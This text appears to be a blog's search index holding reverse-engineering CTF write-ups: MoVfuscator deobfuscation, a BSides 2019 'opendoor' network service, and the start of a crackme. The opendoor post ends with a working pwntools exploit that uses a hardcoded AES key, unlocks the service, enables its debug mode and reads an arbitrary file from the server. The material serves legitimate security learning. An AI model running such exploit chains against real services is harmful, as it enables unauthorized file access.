eax .text:08050583 mov eax, sel_data[edx*4] .text:0805058A mov edx, stack_temp .text:08050590 mov [eax], edx ... snip ... .text:08050709 mov eax, NEW_STACK .text:0805070E mov edx, on .text:08050714 mov data_p, eax .text:08050719 mov eax, sel_data[edx*4] .text:08050720 mov edx, stack_temp .text:08050726 mov [eax], edx .text:08050728 mov edx, dword_81FD234 .text:0805072E mov [eax+4], edx .text:08050731 mov eax, offset fp .text:08050736 mov edx, on .text:0805073C mov data_p, eax .text:08050741 mov eax, sel_data[edx*4] .text:08050748 mov edx, NEW_STACK .text:0805074E mov [eax], edx These instructions push fp, R1, R2, R3, F1, dword_81FD234, D1 in order. Then assigns fp to the current stack pointer. This looks like\npush fp push R1 push R2 push R3 push F1 push D2 push D1 mov fp, esp Now we can write the deobfuscated assembly\nDeobfuscated Code _start: mov sesp, esp mov esp, NEW_STACK mov [esp-16+0], SIGSEGV mov [esp-16+4], offset sa_dispatch mov [esp-16+8], 0 call _sigaction mov [esp-12+0], SIGILL mov [esp-12+4], offset sa_loop mov [esp-12+8], 0 call _sigaction master_loop: mov esp, NEW_STACK mov eax, sesp mov edx, 4 add eax, edx push ecx push dword [ecx-4] push 0x804854e mov target, 0x805036a _804854E: cmp target, 0x804854e jnz check_element push 0 call _exit check_element: cmp target, 0x8048794 jnz _80493B8 push fp push R1 push R2 push R3 push F1 push D2 push D1 mov fp, esp sub esp, 12 lea R3, [fp+9*4] lea R2, [fp+9*4] mov dl, [R2] mov [R3], dl mov R3, [fp+8*4] mov R2, 0x15 add R3, R2 mov [fp-4], R3 mov R3, [fp-4] mov R2, 2 xor R3, R2 mov [fp-8], R3 mov R3, [fp-8] mov R2, 0x1e sub R3, R2 mov [fp-12], R3 movsx R3, byte [fp-12] movsx R2, byte [fp+9*4] cmp R3, R2 mov R0, 0 cmovnz target, 0x80493B8 cmovz target, 0x804959C _80493B8: cmp target, 0x80493B8 mov R0, 1 jnz _804959C _804959C: cmp target, 0x804959C jnz waste_time mov esp, fp ; pop regs ... pop fp mov target, [esp] waste_time: cmp target, 0x8049a88 jnz _8049fc7 ; ... mov target, 0x804fa1c _8049fc7: cmp target, 0x8049fc7 jnz main ; ... main: cmp target, 0x805036a jnz _8051028 push fp, R1, R2, R3, F1, D1 mov fp, esp sub esp, 20*4 lea R3, [fp-9*4] mov R2, 0x80540f0 push 29 push R2 push R3 call __inline_memcpy mov [fp-20*4], 29 lea R3, [fp-19*4] mov R2, offset input push 40 push R2 push R3 call __inline_memcpy mov [fp-4], 0 push offset aGiveTheKeyIfYo call _puts add esp, 4 push offset stdin@@GLIBC_2_0 push 0x28 lea R3, [fp-19*4] push R3 call _fgets lea esp, [esp+4*3] mov [fp-4], 0 mov target, 0x8052455 _8051028: cmp target, 0x8051028 jnz _8051985 push 0x8051012 mov target, 0x8049a88 ; waste_time _8051012: cmp target, 0x8051012 jnz _8051985 push esp mov R3, [fp-4] lea R2, [fp-19*4] add R2, R3 movsz R0, byte [R2] push R0 lea R2, [fp-9*4] add R3, R2 movsx R0, byte [R3] push R0 push 0x8051985 mov target, 0x8048794 ; check_element _8051985: cmp target, 0x8051985 jnz _8051f38 lea esp, [esp+8] cmp R0, 0 cmovz target, 0x8051fa6 push 1 call _exit _8051f38: lea esp, [esp+8] _8051fa6: cmp target, 0x8051fa6 jnz _8052180 _8052180: cmp target, 0x8052180 jnz _8052455 mov R3, [fp-4] mov R2, 1 add R3, R2 mov [fp-4], R3 _8052455: cmp target, 0x8052455 jnz _805294d mov R3, [fp-4] mov R2, [fp-20*4] cmp R3, R2 cmovl target, 0x8051028 _805294D: cmp target, 0x805294d jnz _8052b1f push offset aGoodJob call _puts lea esp, [esp+4] _8052B1F: mov R0, 0 cmp target, 0x8052b1f jnz next mov esp, fp pop R1, R2, R3, F1, D1 pop fp mov target, [esp] ; return addr next: ; raise SIGILL now Analysis Cleaning up a bit, we have main as\ncheck_element: push fp, R1, R2, R3, F1, D2, D1 mov fp, esp sub esp, 12 lea R3, [fp+9*4] ; arg2 lea R2, [fp+9*4] mov dl, [R2] mov [R3], dl mov R3, [fp+8*4] ; arg1 mov R2, 0x15 add R3, R2 mov [fp-4], R3 mov R3, [fp-4] mov R2, 2 xor R3, R2 mov [fp-8], R3 mov R3, [fp-8] mov R2, 0x1e sub R3, R2 mov [fp-12], R3 movsx R3, byte [fp-12] movsx R2, byte [fp+9*4] cmp R3, R2 mov R0, 0 jz L3 mov R0, 1 L3: mov esp, fp ; pop regs pop fp ret main: push fp, R1 ... mov fp, esp sub esp, 80 lea R3, [fp-36] mov R2, 0x80540f0 push 29 push R2 push R3 call __inline_memcpy mov [fp-80], 29 lea R3, [fp-76] mov R2, offset input push 40 push R2 push R3 call __inline_memcpy mov [fp-4], 0 push offset aGiveTheKeyIfYo ; \u0026quot;Give the key, if you think you are worthy.\u0026quot; call puts add esp, 4 push offset stdin@GLIBC_2_0 push 0x28 lea R3, [fp-76] push R3 call fgets add esp, 12 mov [fp-4], 0 jmp _8052455 _8051028: call waste_time mov R3, [fp-4] lea R2, [fp-76] add R2, R3 movsx R0, byte [R2] push R0 lea R2, [fp-36] add R3, R2 movsx R0, byte [R3] push R0 call check_element add esp, 8 cmp R0, 0 jz _8051fa6 push 1 call exit _8051fa6: mov R3, [fp-4] mov R2, 1 add R3, R2 mov [fp-4], R3 _8052455: mov R3, [fp-4] mov R2, [fp-80] cmp R3, R2 jl _8051028 _805294D: push offset aGoodJob call puts add esp, 4 mov esp, fp pop R1, R2, R3, F1, D1 pop fp ret So, we have a for loop that iterates 29 times, calling waste_time first and then check_element with two params - magic[i] and input[i] where magic is the array of 29 bytes at 0x80540f0 and input is the array at fp-76.\ncheck_element checks whether (magic[i]+0x15^2)-0x1e == input[i]. On mismatch the program terminates with exit code 1.\nSolution magic = [ 0x71, 0x73, 0x68, 0x72, 0x86, 0x72, 0x37, 0x37, 0x6B, 0x6A, 0x7B, 0x6F, 0x38, 0x79, 0x72, 0x3C, 0x6A, 0x71, 0x37, 0x7D, 0x6A, 0x82, 0x3B, 0x38, 0x7B, 0x70, 0x79, 0x72, 0x84 ] f = lambda i: chr((i+0x15^2)-0x1e) print \u0026#34;\u0026#34;.join(map(f, x)) So, the flag is flag{g00d_th1ng5_f0r_w41ting}\nReferences MoV is Turing complete\n","date":"2019-04-09T00:00:00+05:30","permalink":"http://localhost:1313/post/deobfuscating-movfuscator-part-2/","title":"Deobfuscating MoVfuscator - Part 2"},{"content":"MoVfuscator is the PoC for the Turing Completeness of Mov instruction.\nYes, you guessed it right. It uses only mov\u0026rsquo;s, except for a few places.\nThis makes reversing difficult, because the control flow is obfuscated.\nI\u0026rsquo;ll be analyzing the challenge Mov of UTCTF'19 using IDA Free.\nMoV binary\nThe Stack Movfuscator uses its own stack. The stack consists of an array of addresses. The stack looks like this\nEach element of the stack is at an offset of 0x200064 from it\u0026rsquo;s stack address. The stack begins at 0x83f70e8 and it grows from high to low address.\nThe stack pointer is saved in the variable sesp. The variable NEW_STACK stores the address of guard.\nmov esp, NEW_STACK ; address of guard mov esp, [esp-0x200068] ; address of A[n-1] mov esp, [esp-0x200068] ; address of A[n-2] ; ... ; n times ; ... ; use esp So, mov esp, [esp-0x200068], subtracts 4 from esp.\nNow we can understand what start does.\nmov dword [esp-4*4], SIGSEGV mov dword [esp-4*4+4], offset sa_dispatch mov dword [esp-4*4+8], 0 call sigaction mov dword [esp-3*4], SIGILL mov dword [esp-3*4+4], offset sa_loop mov dword [esp-3*4+8], 0 call sigaction ; ; ... ; .plt:08048210 public dispatch .plt:08048210 dispatch proc near ; DATA XREF: .data:sa_dispatch↓o .plt:08048210 mov esp, NEW_STACK .plt:08048216 jmp function .plt:08048216 dispatch endp Movfuscator uses SIGSEGV to execute a function, and SIGILL to execute a JMP instruction which jumps to master_loop. Because we can\u0026rsquo;t mov to eip, which is invalid in x86.\nExecution is controlled using the on variable. This is a boolean variable that determines whether a statement will be executed or not.\nThe master_loop sets the value of on and then disables toggle_execution. This is the structure of if statement.\ndef logic_if(condition, dest, src) if (condition) dest = src else discard = src It then adds sesp with 4 and stores the sum in stack_temp.\nPush The array sel_data contains two members - discard and data_p. This is a MUX which selects data_p if on is set. So, if on is set, eax contains the address of NEW_STACK. And the value of esp-4 is stored in NEW_STACK, which is the stack pointer. And then the value of stack_temp is stored in the current stack pointer.\nThe above set of instructions are equivalent to\nmov eax, [stack_temp] sub esp, 4 mov [esp], eax It can also be represented as\npush dword [stack_temp] The sequnce of instructions until 0x0804843C do the following\nmov eax, [sesp] add eax, 4 push eax push dword [sesp] push 0x880484fe It conditionally sets the value of target to branch_temp. The target variable is the destination an unconditional jump. In this code, the target is set to 0x88048744.\nLet\u0026rsquo;s see how jump\u0026rsquo;s are implemented.\n on = 1 ... target = jump_destination ; save registers R, F, D on = 0 ... if (fetch_addr == target) { ; restore registers R, F, D on = 1 } ... The above code saves the registers.\nIt now checks if the fetch address equals the address contained in target. The equal-to comparison is computed for each byte and the result is the logical-and of the four comparisons. The result of the comparison is stored in the boolean variable b0.\nNow if b0 is set, the registers are restored and the on variable is set.\nThis is equivalent to the following if the on variable is set.\npush 0 call _exit You must be wondering how I deduced the call instruction. Here is it\nFunction Call Function calls are implemented using the SIGSEGV signal. The array fault is defined like this\n.data:085F7198 fault dd offset no_fault ; DATA XREF: _start+51F↑r .data:085F719C dd 0 .data:085F71A0 no_fault dd 0 So, fault when indexed with on returns 0 if on is set, otherwise a valid address. This return value is dereferenced which results in a SIGSEGV (Segmentation Fault) if its zero.\nBut since, the value of target is 0x88048744. The control jumps to main.\nIn main, the registers are restored and the on flag is set. After that it pushes fp, R1, R2, R3, F1, dword_804e04c, D1 into the stack\nThe function prologue It first assigns the frame pointer fp to the current stack pointer and allocates 37 dwords (148 bytes) from the stack. This is equivalent to the following x86\nmov ebp, esp ; ebp is **fp** sub esp, 148 Computes fp-19*4 and stores the value of R3 into the address. So, this is basically\nmov R3, 0 mov [fp-19*4], R3 Great ! So, we have a dword at fp-0x4c initialized to 0.\nThen we have an array of bytes at fp-0x47 initialized as follows\nmov R0, 0x1a mov byte [fp-18*4], R0 mov R0, 0x19 mov byte [fp-0x47], R0 mov R0, 11 mov byte [fp-0x46], R0 mov R0, 0x31 mov byte [fp-0x45], R0 mov R0, 6 mov byte [fp-17*4], R0 mov R0, 4 mov byte [fp-0x43], R0 mov R0, 0x18 mov byte [fp-0x42], R0 mov R0, 0x10 mov byte [fp-0x41], R0 mov R0, 10 mov byte [fp-16*4], R0 mov R0, 0x33 mov byte [fp-0x3f], R0 mov R0, 0x19 mov byte [fp-0x3e], R0 mov R0, 10 mov byte [fp-0x3d], R0 mov R0, 0x33 mov byte [fp-15*4], R0 mov R0, 0 mov byte [fp-0x3b], R0 mov R0, 10 mov byte [fp-0x3a], R0 mov R0, 0x3c mov byte [fp-0x39], R0 mov R0, 0x19 mov byte [fp-14*4], R0 mov R0, 13 mov byte [fp-0x37], R0 mov R0, 6 mov byte [fp-0x36], R0 mov R0, 0x19 mov byte [fp-0x35], R0 mov R0, 0x3c mov byte [fp-13*4], R0 mov R0, 14 mov byte [fp-0x33], R0 mov R0, 0x10 mov byte [fp-0x32], R0 mov R0, 0x3c mov byte [fp-0x31], R0 mov R0, 0x10 mov byte [fp-12*4], R0 mov R0, 12 mov byte [fp-0x2f], R0 mov R0, 0x32 mov byte [fp-0x2e], R0 mov R0, 10 mov byte [fp-0x2d], R0 mov R0, 0x14 mov byte [fp-11*4], R0 mov R0, 13 mov byte [fp-0x2b], R0 mov R0, 6 mov byte [fp-0x2a], R0 mov R0, 0x19 mov byte [fp-0x29], R0 mov R0, 0x3c mov byte [fp-10*4], R0 mov R0, 0x19 mov byte [fp-0x27], R0 mov R0, 6 mov byte [fp-0x26], R0 mov R0, 0x33 mov byte [fp-0x25], R0 mov R0, 4 mov byte [fp-9*4], R0 mov R0, 10 mov byte [fp-0x23], R0 mov R0, 0x33 mov byte [fp-0x22], R0 mov R0, 0x19 mov byte [fp-0x21], R0 mov R0, 14 mov byte [fp-8*4], R0 mov R0, 6 mov byte [fp-0x1f], R0 mov R0, 0x31 mov byte [fp-0x1e], R0 mov R0, 0x31 mov byte [fp-0x1d], R0 mov R0, 0x1e mov byte [fp-7*4], R0 mov R0, 0x3c mov byte [fp-0x1b], R0 mov R0, 0x17 mov byte [fp-0x1a], R0 mov R0, 10 mov byte [fp-0x19], R0 mov R0, 0x31 mov byte [fp-6*4], R0 mov R0, 6 mov byte [fp-0x17], R0 mov R0, 0x19 mov byte [fp-0x16], R0 mov R0, 10 mov byte [fp-0x15], R0 mov R0, 9 mov byte [fp-5*4], R0 mov R0, 0x3c mov byte [fp-0x13], R0 mov R0, 0x19 mov byte [fp-0x12], R0 mov R0, 12 mov byte [fp-0x11], R0 mov R0, 0x3c mov byte [fp-4*4], R0 mov R0, 0x19 mov byte [fp-0xf], R0 mov R0, 13 mov byte [fp-0xe], R0 mov R0, 10 mov byte [fp-0xd], R0 mov R0, 0x3c mov byte [fp-3*4], R0 mov R0, 0 mov byte [fp-0xb], R0 mov R0, 13 mov byte [fp-0xa], R0 mov R0, 6 mov byte [fp-0x9], R0 mov R0, 0x31 mov byte [fp-2*4], R0 mov R0, 0x31 mov byte [fp-7], R0 mov R0, 10 mov byte [fp-6], R0 mov R0, 0x33 mov byte [fp-5], R0 mov R0, 4 mov byte [fp-4], R0 mov R0, 10 mov byte [fp-3], R0 mov R0, 2 mov byte [fp-2], R0 At 0x804ba9c, the int variable at fp-0x4c is set to 0.\nIf target is 0x8804bb37, it executes the following\nif (target == 0x8804bb37) { ; restore the registers R{0,1,2,3} = jmp_r{0,1,2,3} F{0,1} = jmp_f{0,1} D{0,1} = jmp_d{0, 1} dword_804e044 = dword_85f717c dword_804e04c = dword_85f7184 ; set execution flag on = 1 } mov R3, [fp-19*4] if (on) { mov R3, [R3] mov R2, [fp-37*4] add R2, R3 mov R1, [fp-18*4] add R3, R1 mov R0, byte [R3] mov R3, R0 xor R3, 0x53 sub R3, 3 xor R3, 0x33 mov R0, R3 mov [R2], R0 } Since, the target contains 0x88048744 which is not 0x8804bb37, none of the instructions in the if enclosed by on is executed.\nAt 0x0804C2D4, we have another branch check\nif (target == 0x8804C2D4) { RESTORE_REGS() on = 1 } mov R3, [fp-19*4] if (on) { add R3, 1 mov [fp-19*4], R3 mov R3, [fp-19*4] setc sbb R3, 0x47 mov branch_temp, 0x8804bb37 } alu_false contains 1 at index 0, and 0 at the remaining indices. So, this sets the complement of the Carry flag.\nZeroFlag is evaluated as a NOR logic, i.e., ZF = !(alu_s[0] | alu_s[1] | alu_s[2] | alu_s[3])\nalu_b7 is an array of 256 dwords, the first 128 are zero, and the rest are 1. Indexing into this array determines the Sign bit (bit 7) of the index.\nOkay, so alu_cmp_of represents a truth table. Of what ? Well, there are only two out of the eight minterms set. So, we get the following SOP\nx'ys + xy's' Where x, y, s are the sign bits of alu_x, alu_y, alu_z.\nCool ! This is the overflow flag\nIt xor\u0026rsquo;s SignFlag and OverflowFlag and sets target to branch_temp which is 0x8804bb37. By x0ring the sign and overflow flags we get the LessThan flag.\nSo, if R3 is less than 0x47, the target is set to 0x8804bb37.\nThen we have the following\nmov byte [fp-0x4d], 0 if (target == 0x8804CA3B) { on = 1 } if (on) { mov esp, fp mov D1, [esp] mov dword_804e04c, [esp+4] sub esp, 4*2 mov eax, [esp] sub esp, 4 mov F1, eax mov eax, [esp] sub esp, 4 mov R3, eax mov eax, [esp] sub esp, 4 mov R2, eax mov eax, [esp] sub esp, 4 mov R1, eax mov eax, [esp] sub esp, 4 mov fp, eax mov eax, [esp] sub esp, 4 mov branch_temp, eax mov target, branch_temp on = 0 } A SIGILL is executed which causes the control to jump to master loop. And the execution of the instructions are skipped until the address the control reaches at 0x804bb37\nSo, this is basically a while loop.\nThe control first compares R3 with 0x47 and branches to 0x804bb37 while R3 is less than 0x47. When the condition becomes false, it executes from 0x804ca3b\nAlgorithm So, the logic is\nint main() { int i = 0; char arr[] = { 26, 25, 11, 49, 6, 4, 24, 16, 10, 51, 25, 10, 51, 0, 10, 60, 25, 13, 6, 25, 60, 14, 16, 60, 16, 12, 50, 10, 20, 13, 6, 25, 60, 25, 6, 51, 4, 10, 51, 25, 14, 6, 49, 49, 30, 60, 23, 10, 49, 6, 25, 10, 9, 60, 25, 12, 60, 25, 13, 10, 60, 0, 13, 6, 49, 49, 10, 51, 4, 10, 2 }; for (i = 0; i \u0026lt; 0x47; ++i) { arr[i] = (arr[i]^0x53)-3 ^ 0x33; } } Executing the above code, yields the flag - utflag{sentence_that_is_somewhat_tangentially_related_to_the_challenge}\nReferences MoV is Turing Complete\n","date":"2019-03-14T00:00:00+05:30","permalink":"http://localhost:1313/post/understanding-the-movfuscator/","title":"Understanding the Movfuscator"},{"content":"This one is a pretty interesting challenge. My solution is just static analysis.\nBut before jumping into main, I\u0026rsquo;ll be analyzing the opendoor namespace\nSo, the class Buffer has two members; a vector of bytes and a offset indicating where to start the next read\nnamespace opendoor { class Buffer { shared_ptr\u0026lt;vector\u0026lt;byte\u0026gt;\u0026gt; m_buffer; int m_offset; public: Buffer() { m_buffer = make_shared(vector\u0026lt;byte\u0026gt;); m_offset = 0; } // ...  }; }; Now lets analyze the Buffer::read\u0026lt;T\u0026gt; functions. This is important as it tells how the server unmarshalls the data.\nBuffer::read\u0026lt;bool\u0026gt; is a wrapper to Buffer::read\u0026lt;uchar\u0026gt;.\nInt32 and Int64 are being read in BigEndian\ni.e., var_20[7 - var_14] = Buffer::read\u0026lt;uchar\u0026gt;()\nread\u0026lt;shared_ptr\u0026lt;vector\u0026lt;uchar\u0026gt;\u0026gt;\u0026gt; and read\u0026lt;string\u0026gt; work the same. The first call read\u0026lt;uint\u0026gt; to read the no. of. bytes and read\u0026lt;uchar\u0026gt; to read that many bytes i.e., a vector is a string of bytes prefixed by its length\nThe constructor of AESCrypter calls the superclass constructor, before initializing the members. AESCrypter::decrypt and AESCrypter::encrypt perform decryption and encryption using AES 256 CBC.\nnamespace opendoor { class Crypter { public: virtual void decrypt(shared_ptr\u0026lt;Buffer\u0026gt;) = 0; virtual void encrypt(shared_ptr\u0026lt;Buffer\u0026gt;) = 0; }; class AESCrypter : public Crypter { char* key; char* iv; public: AESCrypter() { key = opendoor::def_key; iv = opendoor::def_iv; } AESCrypter(char* k, char* i) { key = k; iv = i; } void* decrypt(shared_ptr\u0026lt;Buffer\u0026gt; p) { buf = _Decrypt(*p, key, iv); return make_shared\u0026lt;Buffer\u0026gt;(buf); } void* encrypt(shared_ptr\u0026lt;Buffer\u0026gt; p) { buf = _Encrypt(*p, key, iv); ans = make_shared\u0026lt;Buffer\u0026gt;(); ans-\u0026gt;write(buf.size()); ans-\u0026gt;write(buf); return ans; } }; }; There is another class that implements Crypter. Its the PlainCrypter. Well you have guessed it right. Its a dummy class which neither encrypts nor decrypts. It has another parameter which if set to TRUE, prints debug logs.\nLet\u0026rsquo;s move to opendoor::State which encapsulates a lock for the magic door.\nThe methods of State are straightforward. Here\u0026rsquo;s the representation of State\nnamespace opendoor { class State { byte m_is_unlocked; byte m_is_debuggable; int32 m_unlock_count; int64 m_door_id; public: State() { m_is_unlocked = m_is_debuggable = 0; m_unlock_count = 0; m_door_id = 0x55AA55AA5A5AA5A5; } void unlock() { m_is_unlocked = 1; m_unlock_count++; } void lock() { m_is_unlocked = 0; } // getters ...  }; }; The Messaging Protocol The Message class consists of six methods - parse_message, execute, to_string, serialize, ptr, and get_id out of which parse_message, to_string and get_id are pure virtual, i.e., they have to be implemented in the classes implementing Message.\nThe subclasses of Message are of:\n Messages that have a request and response - UnlockMessage, DebugMessage, PingMessage ErrorMessage  Message::serialize performs the common serialization.\nIt writes the message_id followed by the timestamp returned by time().\nNow let\u0026rsquo;s go to Message::ParseMessage\nIt reads two Int32 words i.e., the message_id and timestamp and checks if the recieved timestamp bounded by 5 seconds of the current timestamp. Otherwise it responds with an INVALID_TIMESTAMP ErrorMessage. I\u0026rsquo;ll discuss later how I got error constant names.\nThe generic parsing routine\nParseMessage(shared_ptr\u0026lt;Buffer\u0026gt; p) { msg_id = p-\u0026gt;read(); msg_stamp = p-\u0026gt;read(); // time_in_window(a, b) == return abs(time(NULL)-a) \u0026lt;= b  if (! time_in_window(msg_stamp, 5)) { err = new ErrorMessage(INVALID_TIMESTAMP); return err-\u0026gt;ptr(); } f = messages_map.find(msg_id) if (f == messages_map.end()) { err = new ErrorMessage(INVALID_MESSAGE); return err-\u0026gt;ptr(); } msg = (f-\u0026gt;second)(); // do message specific parse  if (! msg-\u0026gt;parse_message(p)) { err = new ErrorMessage(INVALID_PARSE); return err-\u0026gt;ptr(); } } So, the timestamp must be within 5 seconds.\nMessage also defines 7 lambdas that creates an instance each of the concrete message classes and encapsulates within a shared_ptr.\n1. UnlockMessage UnlockMessage::parse_message reads two Int64 words and stores them in its member variables.\nClearly, the first member variable must be non zero and the second member variable must equate to door_number. The _good branch continues at\nwhich unlocks the door and creates an UnlockResponse. While the _bad branch, locks the door instead and returns an ACCESS_DENIED ErrorMessage.\nNow we can represent Message as\nstruct Message { int32_t id; int32_t time_stamp; union { union { UnlockMessage uMsg; DebugMessage dMsg; PingMessage pMsg; } msg; ErrorMessage eMsg; }; }; struct UnlockMessage { int64_t do_unlock; int64_t door_no; }; 2. DebugMessage DebugRequestMessage::parse_message:\nIt reads an Int32 which can be either 1 or 2. If the value read is 1, then it reads a boolean. If the value is 2, it reads a string. These are stored in member variables at offsets +8, +12, +16\nDebugRequestMessage::execute:\nIf the member at offset +8 is 1 then **DebugRequestMessage::handle_debug_message_** is called. If the value is not 1 and the lock is not debuggable, an **ACCESS_DENIED** Error is returned. Whereas if the value is 2, and the lock is debuggable, **DebugRequestMessage::handle_readfile** is called.\nThus the member at offset +8, denotes the debug_type\nYay ! This looks promising !\nSo, to execute **handle_readfile_**, we must have the lock\u0026rsquo;s **DEBUG** flag turned on. But the lock\u0026rsquo;s debug flag is initially 0.\n**handle_debug_message_**:\nIf the member at offset +12 is 1, the routine turns on the door\u0026rsquo;s DEBUG flag if the door is unlocked. If the value at offset +12 is not 1, then the door\u0026rsquo;s debug flag is turned off.\nThe member at offset +12 denotes the flag for turning on lock\u0026rsquo;s debug flag.\n**handle_readfile_** reads 4K bytes from the file whose path is stored in the member variable at offset +16 and returns the contents.\nstruct DebugMessage { int32_t debug_type; int8_t b_debug_lock; std::string filePath; }; Approach  Send UnlockMessage to set the lock\u0026rsquo;s status to UNLOCKED Send DebugMessage of type 1 to set the lock\u0026rsquo;s DEBUG flag Send DebugMessage of type 2 to read any file !!  The ConnectionPool class uses non-blocking IO. It maintains a map whose keys are the client socket descriptors and values are instances of ConnectionHandler. The **do_read_** (**do_write**) methods read (write) a vector of bytes (from the socket) in the same format as **Buffer** reads (writes).\nHere\u0026rsquo;s the vtable for ConnectionHandler\nThe members of ConnectionHandler are\nnamespace opendoor { class ConnectionHandler { int32_t socket; /* +0x8 */ bool b_closed; /* +0xC */ int32_t read_size; /* +0x10 */ vector\u0026lt;byte\u0026gt; write_vec; /* +0x18 */ vector\u0026lt;byte\u0026gt; read_vec; /* +0x30 */ shared_ptr\u0026lt;Buffer\u0026gt; buffer; /* +0x48 */ shared_ptr\u0026lt;State\u0026gt; lock; /* +0x58 */ shared_ptr\u0026lt;Crypter\u0026gt; cryptr; /* +0x68 */ // ...  }; } Let\u0026rsquo;s visit **ConnectionHandler::process_message_**\nThe routine calls cryptr-\u0026gt;decrypt() on buffer. If the decryption is successful, it proceeds to ParseMessage\nIf the message has been parsed successfully, the execute() method is invoked. If it succeeds, a positive response is returned by invoking serialize() followed by cryptr-\u0026gt;encrypt()\nLast but not the least, init\nThe second routine, sets up the maps as follows\nmessages = { # opendoor::Message::{lambda(void)#i}::operator() 1 : 0x48900, # PingRequest 2 : 0x48940, # PingResponse 3 : 0x48980, # UnlockRequest 4 : 0x489C0, # UnlockResponse 5 : 0x48A00, # DebugRequest 6 : 0x48A40, # DebugResponse -1 : 0x48A80 # ErrorMessage } error_messages = { 0 : \u0026#34;Unknown\u0026#34;, 1 : \u0026#34;Invalid Message Type\u0026#34;, 2 : \u0026#34;Invalid Timestamp\u0026#34;, 3 : \u0026#34;Error Parsing\u0026#34;, 4 : \u0026#34;Crypto Error\u0026#34;, 0x193 : \u0026#34;Access Denied\u0026#34;, 0x194 : \u0026#34;Resource Not Found\u0026#34; } main is also straightforward. It calls parse_flags to determine the default Crypter instance to be used. The default is AESCrypter. If -n is specified, PlainCrypter is used. The default port is 4848 which can be changed with -p option.\nSo, we have to write the encrypted Message prefixed by the size of the encrypted message to the server.\nSource Code #!/usr/bin/python from Crypto.Cipher import AES from pwn import * PLAINTEXT = 0 def pad(m): return m+chr(16-len(m)%16)*(16-len(m)%16) def unpad(s): return s[:-ord(s[len(s)-1:])] door_number = 0x55AA55AA5A5AA5A5 key = \u0026#39;\\x97\\x8B\\x8B\\x8F\\x8C\\xC5\\xD0\\xD0\\x88\\x88\\x88\\xD1\\x8C\\x86\\x8C\\x8B\\x9A\\x92\\x90\\x89\\x9A\\x8D\\x93\\x90\\x8D\\x9B\\xD1\\x9C\\x90\\x92\\xD0\\xFF\u0026#39; iv = \u0026#39;notaflagnotaflag\u0026#39; def encrypt(msg): aes = AES.new(key=key, IV=iv, mode=AES.MODE_CBC) ans = aes.encrypt(pad(msg)) del aes return ans def decrypt(msg): aes = AES.new(key=key, IV=iv, mode=AES.MODE_CBC) ans = aes.decrypt(msg) del aes return unpad(ans) def i32(i): return p32(i, endian=\u0026#39;big\u0026#39;) def i64(i): return p64(i, endian=\u0026#39;big\u0026#39;) def pStr(s): return i32(len(s)) + s def debugReq1(f): return i32(1) + chr(f) def debugReq2(f): return i32(2) + pStr(f) def unlockReq(): return i64(1) + i64(door_number) def msg(msg_id, oMsg): body = i32(msg_id) + i32(int(time.time()+2)) + oMsg if not PLAINTEXT: body = encrypt(body) m = i32(len(body)) + body return m def parse(msg): size = u32(msg[:4], endian=\u0026#39;big\u0026#39;) print \u0026#34;[*] Message size: %dbytes\u0026#34; % size msg = msg[4:4+size] if not PLAINTEXT: msg = decrypt(msg) msg_id = u32(msg[:4], endian=\u0026#39;big\u0026#39;) print \u0026#34;[*] Message ID: %d\u0026#34; % msg_id time_stamp = u32(msg[4:8], endian=\u0026#39;big\u0026#39;) print \u0026#34;[*] Timestamp: %d\u0026#34; % time_stamp if msg_id == 4: uflag = u64(msg[8:16], endian=\u0026#39;big\u0026#39;) door = u64(msg[16:24], endian=\u0026#39;big\u0026#39;) print \u0026#34;[ Unlock ] - [ unlock_flag : %d, door_num : %x]\u0026#34; % (uflag, door) elif msg_id == 6: debug_option = u32(msg[8:12], endian=\u0026#39;big\u0026#39;) if debug_option == 1: print \u0026#34;[ Debug ] - [ debug_flag : %d]\u0026#34; % ord(msg[12]) else: size = u32(msg[12:16], endian=\u0026#39;big\u0026#39;) text = msg[16:16+size] print \u0026#34;[ Debug ] - [ text : \u0026#39;%s\u0026#39; ]\u0026#34; % text r = remote(\u0026#39;opendoor-ea62dae9.challenges.bsidessf.net\u0026#39;, 4141) # unlock request to set unlock flag # send debug request with debug flag on to debug # send debug request to read any file r.send(msg(3, unlockReq())) parse(r.recv()) r.send(msg(5, debugReq1(1))) parse(r.recv()) r.send(msg(5, debugReq2(\u0026#39;/home/opendoor/flag.txt\u0026#39;))) parse(r.recv()) r.close() And the Output \u0026hellip;\nSolved after the CTF was over :( ","date":"2019-03-06T00:00:00+05:30","permalink":"http://localhost:1313/post/bsides-ctf-2019-opendoor/","title":"BSides CTF 2019 - opendoor"},{"content":"This is a beautiful challenge by ttlhacker from crackmes.one.\nDescription  x86_64 linux binary (tested on debian 9 and ubuntu 18.04, should run on any distro). Takes one command line argument and outputs \u0026ldquo;OK!\u0026rdquo; if it\u0026rsquo;s correct, \u0026ldquo;Wrong\u0026rdquo; if it\u0026rsquo;s not.\nPartially written in C, actual verification routine is assembly.\nDon\u0026rsquo;t patch the binary, of course - find the correct input.\n Let\u0026rsquo;s get started :-)\n╭ (fcn) main 110 │ int main (int argc, char **argv, char **envp); │ ; arg int argc @ rdi │ ; arg char **argv @ rsi │ ; DATA XREF from entry0 (0x107d) │ 0x00000fc0 55 push rbp │ 0x00000fc1 53 push rbx │ 0x00000fc2 4889f5 mov rbp, rsi ; argv │ 0x00000fc5 89fb mov ebx, edi ; argc │ 0x00000fc7 4883ec08 sub rsp, 8 │ 0x00000fcb e8f6090000 call make_alt_stack │ 0x00000fd0 84c0 test al, al │ 0x00000fd2 ba01000000 mov edx, 1 │ ╭─\u0026lt; 0x00000fd7 744f je 0x1028 │ │ 0x00000fd9 e887090000 call register_sigill │ │ 0x00000fde 84c0 test al, al │ │ 0x00000fe0 ba02000000 mov edx, 2 │ ╭──\u0026lt; 0x00000fe5 7441 je 0x1028 │ ││ 0x00000fe7 4863fb movsxd rdi, ebx │ ││ 0x00000fea 4889ee mov rsi, rbp │ ││ 0x00000fed e89e010000 call verify_flag │ ││ 0x00000ff2 4883f801 cmp rax, 1 │ ││ 0x00000ff6 488d3dda1000. lea rdi, str.Wrong ; 0x20d7 ; \u0026quot;Wrong\u0026quot; │ ╭───\u0026lt; 0x00000ffd 7422 je 0x1021 │ │││ 0x00000fff 4883f802 cmp rax, 2 │ │││ 0x00001003 488d3dd31000. lea rdi, str.hell86_crackme__ ; 0x20dd │ ╭────\u0026lt; 0x0000100a 7415 je 0x1021 │ ││││ 0x0000100c 4885c0 test rax, rax │ ││││ 0x0000100f 488d3dbd1000. lea rdi, [0x000020d3] ; \u0026quot;OK!\u0026quot; │ ││││ 0x00001016 488d05021100. lea rax, str.You_have__a_bug ; 0x211f ; \u0026quot;You have 